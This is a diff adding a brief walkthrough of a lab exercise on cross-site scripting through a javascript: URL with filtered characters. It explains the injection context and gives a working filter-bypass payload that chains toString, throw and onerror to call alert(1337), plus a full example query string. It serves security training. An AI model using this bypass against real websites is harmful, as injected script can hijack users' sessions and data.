@@ -1,0 +1,52 @@
+This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks
+
+
+To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message
+
+
+Most of our inputs are going throw fetch function
+
+
+<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d2'}).finally(_ => window.location = '/')"
+
+
+Payload :
+
+x=x=>{throw/**/onerror=alert,1337},toString=x,window+''
+
+
+window+' '  > toString > throw > onerror=alert , 1337
+
+throw >  onerror > alert 1337
+
+In this js code  a window has nothing to show  and than goes tostring which calls x and x has setted up a function which throws goes to 1337  and  1337 calls onerror.
+onerror is override with alert
+
+
+
+5&'},payload,{x:'
+
+
+5&'},       > First Argument and post id
+
+x=x=>{throw/**/onerror=alert,1337},      > 2nd Argument
+
+toString=x,window+''                > 3rd Argument
+
+,{x:'       >4th Argument
+
+
+
+Note[Use the same post id where u wana use the code if u use 5 in a postid=2 the code wont work ]
+
+Example    postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+
+
+without post id Main Code :
+
+&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+
+
+
+
+The lab will be solved, but the alert will only be called if you click "Back to blog" at the bottom of the page
